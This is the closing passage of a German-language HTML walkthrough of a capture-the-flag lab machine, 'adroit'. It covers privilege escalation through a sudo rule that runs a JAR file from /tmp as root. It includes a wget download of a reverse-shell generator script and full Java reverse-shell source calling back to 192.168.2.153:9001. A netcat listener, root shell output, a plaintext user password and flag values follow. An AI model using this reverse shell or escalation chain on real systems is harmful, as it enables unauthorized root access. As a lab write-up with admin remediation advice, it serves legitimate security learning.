+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Thu Jan 14 23:14:06 2021 from 10.0.2.15
+<span class="prompt">writer@adroit:~$ </span></pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Als Benutzer `writer` wird das Home-Verzeichnis aufgelistet und die Datei `user.txt` gelesen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die User-Flag wird erfolgreich gefunden: `<span class="password">61de3a25161dcb2b88b5119457690c3c</span>`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Notieren Sie die Flag. Konzentrieren Sie sich nun auf die Rechteausweitung.
+             <br><strong>Empfehlung (Admin):</strong> Keine direkten Maßnahmen bezüglich der Flag selbst.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">writer@adroit:~$ <span class="command">ls</span></div>
+                     <pre>user.txt</pre>
+                     <div class="prompt">writer@adroit:~$ <span class="command">cat user.txt</span></div>
+                     <pre><span class="password">61de3a25161dcb2b88b5119457690c3c</span></pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `sudo -l` wird ausgeführt, um die `sudo`-Berechtigungen des Benutzers `writer` zu überprüfen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Benutzer `writer` darf den Befehl `/usr/bin/java -jar /tmp/testingmyapp.jar` als `root` ohne Passwort (`NPASSWD`) ausführen. Dies ist ein klarer Vektor zur Rechteausweitung, da der Benutzer eine JAR-Datei im `/tmp`-Verzeichnis (auf das `writer` Schreibzugriff hat) platzieren und diese dann als Root ausführen kann.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+            <ol><li>Erstellen Sie eine bösartige JAR-Datei, die eine Reverse Shell oder einen anderen Payload ausführt (z.B. Hinzufügen eines SUID-Binaries oder eines neuen Root-Benutzers).</li><li>Kopieren Sie diese JAR-Datei als `/tmp/testingmyapp.jar` auf das Zielsystem.</li><li>Starten Sie einen Listener auf Ihrem Angreifer-System.</li><li>Führen Sie den `sudo`-Befehl aus: `sudo /usr/bin/java -jar /tmp/testingmyapp.jar`.</li></ol>
+            <strong>Empfehlung (Admin):</strong> Diese `sudo`-Regel ist extrem unsicher und sollte sofort entfernt werden. Erlauben Sie niemals die Ausführung von Dateien aus weltweit beschreibbaren Verzeichnissen wie `/tmp` mit `sudo`. Wenn ein Benutzer einen Java-Prozess als Root starten muss, verwenden Sie einen festen, nicht überschreibbaren Pfad für die JAR-Datei und stellen Sie sicher, dass die JAR-Datei selbst sicher ist.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">writer@adroit:~$ <span class="command">sudo -l</span></div>
+                     <pre>
+[sudo] password for writer: <span class="comment">(Passwort 'just.write.my.ideas' eingegeben)</span>
+Matching Defaults entries for writer on adroit:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User writer may run the following commands on adroit:
+    <span class="password">(root) NOPASSWD: /usr/bin/java -jar /tmp/testingmyapp.jar</span></pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Ein Shell-Skript (`generate-java-reverse-shell.sh`) wird von GitHub heruntergeladen und ausführbar gemacht. Dieses Skript generiert den Java-Quellcode für eine Reverse Shell und kompiliert ihn zu einer JAR-Datei.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein praktischer Weg, um den benötigten Java-Reverse-Shell-Payload zu erstellen. Das Skript generiert eine `Shell.java`-Datei (deren Inhalt kurz gezeigt wird) und kompiliert sie wahrscheinlich zu einer JAR-Datei (z.B. `shell_*.jar`). Die Ziel-IP und der Port für die Reverse Shell müssen im Skript oder im generierten Java-Code angepasst werden.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+             <ol><li>Bearbeiten Sie das Skript oder den generierten Java-Code, um die korrekte IP-Adresse Ihres Angreifer-Systems und den gewünschten Listener-Port einzutragen (hier wird `192.168.2.153:9001` verwendet).</li><li>Führen Sie das Skript `./generate-java-reverse-shell.sh` aus, um die JAR-Datei zu erstellen.</li><li>Benennen Sie die resultierende JAR-Datei in `testingmyapp.jar` um und kopieren Sie sie nach `/tmp` auf dem Zielsystem.</li></ol>
+             <strong>Empfehlung (Admin):</strong> Beschränken Sie die Möglichkeit für Benutzer, beliebige Skripte aus dem Internet herunterzuladen und auszuführen. Überwachen Sie ausgehende Verbindungen.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">writer@adroit:~$ <span class="command">wget https://gist.githubusercontent.com/FrankSpierings/e330e3aea3152f816c202b883887dd60/raw/bbd20431ece0432955e55f938a41da09ff86e544/generate-java-reverse-shell.sh; chmod +x generate-java-reverse-shell.sh</span></div>
+                     <pre>
+--2022-10-18 12:21:28--  https://gist.githubusercontent.com/FrankSpierings/e330e3aea3152f816c202b883887dd60/raw/bbd20431ece0432955e55f938a41da09ff86e544/generate-java-reverse-shell.sh
+Resolving gist.githubusercontent.com (gist.githubusercontent.com)... 185.199.110.133, 185.199.108.133, 185.199.109.133, ...
+Connecting to gist.githubusercontent.com (gist.githubusercontent.com)|185.199.110.133|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 1371 (1.3K) [text/plain]
+Saving to: ‘generate-java-reverse-shell.sh’
+
+generate-java-reverse-shell.s 100%[===============================================>]   1.34K  --.-KB/s    in 0s
+
+<span class="password">2022-10-18 12:21:28 (106 MB/s) - ‘generate-java-reverse-shell.sh’ saved [1371/1371]</span></pre>
+                    <div class="prompt">writer@adroit:~$ <span class="command">nano generate-java-reverse-shell.sh</span></div> <span class="comment"># (IP und Port anpassen)</span>
+                    <div class="prompt">writer@adroit:~$ <span class="command">./generate-java-reverse-shell.sh</span></div>
+                     <pre>
+<span class="comment">// Generierter Java Code (Auszug)</span>
+import java.io.IOException;
+import java.io.InputStream;
+import java.io.OutputStream;
+import java.net.Socket;
+
+public class Shell {
+  public static void main(String[] args) throws Exception {
+    String host = "<span class="command">192.168.2.153</span>"; <span class="comment">// Angepasste IP</span>
+    int port = <span class="command">9001</span>; <span class="comment">// Angepasster Port</span>
+    String cmd = "bash";
+    Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
+    Socket s = new Socket(host, port);
+    InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
+    OutputStream po = p.getOutputStream(), so = s.getOutputStream();
+    while (!s.isClosed()) {
+      while (pi.available() > 0) so.write(pi.read());
+      while (pe.available() > 0) so.write(pe.read());
+      while (si.available() > 0) po.write(si.read());
+      so.flush();
+      po.flush();
+      Thread.sleep(50);
+      try {
+        p.exitValue();
+        break;
+      } catch (Exception e) {}
+    };
+    p.destroy();
+    s.close();
+  }
+}</pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Die durch das Skript generierte JAR-Datei (z.B. `shell_1666097179.jar`) wird in `/tmp/testingmyapp.jar` umbenannt und ausführbar gemacht.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Dies platziert die bösartige JAR-Datei an dem Ort, von dem aus der `sudo`-Befehl sie als Root ausführen wird.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Starten Sie den Netcat-Listener auf Port 9001 auf dem Angreifer-System (`nc -nlvp 9001`). Führen Sie dann den `sudo`-Befehl aus: `sudo -u root /usr/bin/java -jar /tmp/testingmyapp.jar`.
+             <br><strong>Empfehlung (Admin):</strong> Entfernen Sie die unsichere `sudo`-Regel. Überwachen Sie das `/tmp`-Verzeichnis.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">writer@adroit:~$ <span class="command">mv shell_1666097179.jar /tmp/testingmyapp.jar</span></div>
+                     <div class="prompt">writer@adroit:~$ <span class="command">chmod +x /tmp/testingmyapp.jar</span></div>
+                 </div>
+             </div>
+        </section>
+
+        <section id="poc">
+            <h2>Proof of Concept (Root Exploit)</h2>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Netcat-Listener wird auf dem Angreifer-System gestartet. Auf dem Zielsystem führt der Benutzer `writer` den `sudo`-Befehl aus, der die präparierte JAR-Datei `/tmp/testingmyapp.jar` als Root startet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> <span class="password">Der Exploit ist erfolgreich!</span> Die Java-Reverse-Shell wird als Root ausgeführt und verbindet sich zurück zum Netcat-Listener des Angreifers. Die `id`-Ausgabe (`uid=0(root) gid=0(root) groups=0(root)`) bestätigt die erlangten Root-Rechte.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+            <ol><li>Root-Zugriff wurde erlangt.</li><li>Lesen Sie die Root-Flag (`cat /root/root.txt`).</li><li>Führen Sie Aufräumarbeiten durch (Löschen von `/tmp/testingmyapp.jar`, dem Generator-Skript etc.).</li></ol>
+            <strong>Empfehlung (Admin):</strong> Entfernen Sie die unsichere `sudo`-Regel. Überprüfen Sie das System auf weitere nicht autorisierte Änderungen oder Backdoors.</p>
+            <div class="code-block">
+                 <div class="terminal"> <span class="comment"># Auf Angreifer-System</span>
+                     <div class="prompt">┌──(root㉿cyber)-[~/HackingTools/revshellJava]
+└─# <span class="command">nc -nlvp 9001</span></div>
+                     <pre>listening on [any] 9001 ...</pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal"> <span class="comment"># Auf Zielsystem (als writer)</span>
+                     <div class="prompt">writer@adroit:~$ <span class="command">sudo -u root /usr/bin/java -jar /tmp/testingmyapp.jar</span></div>
+                     <pre><span class="comment">[Keine Ausgabe auf dem Ziel, Verbindung geht zum Listener]</span></pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal"> <span class="comment"># Auf Angreifer-System (im Listener)</span>
+                     <pre>
+listening on [any] 9001 ...
+<span class="password">connect to [192.168.2.153] from (UNKNOWN) [192.168.2.156] 43262</span></pre>
+                     <span class="command">id</span>
+                     <pre><span class="password">uid=0(root) gid=0(root) groups=0(root)</span></pre>
+                     <span class="command">pwd</span>
+                     <pre>/home/writer</pre>
+                     <span class="command">cd /root</span>
+                     <span class="command">ls</span>
+                     <pre>root.txt</pre>
+                     <span class="command">cat root.txt</span>
+                     <pre><span class="password">017a030885f25af277dd891d0f151845</span></pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /home/writer/user.txt</div>
+                     <div class="flag-value"><span class="password">61de3a25161dcb2b88b5119457690c3c</span></div>
+                 </div>
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /root/root.txt</div>
+                     <div class="flag-value"><span class="password">017a030885f25af277dd891d0f151845</span></div>
+                 </div>
+             </div>
+         </section>
+
+    </div> <!-- Ende .container -->
+<footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 18. Oktober 2022</p>
+    </footer>
+</body>
+</html>
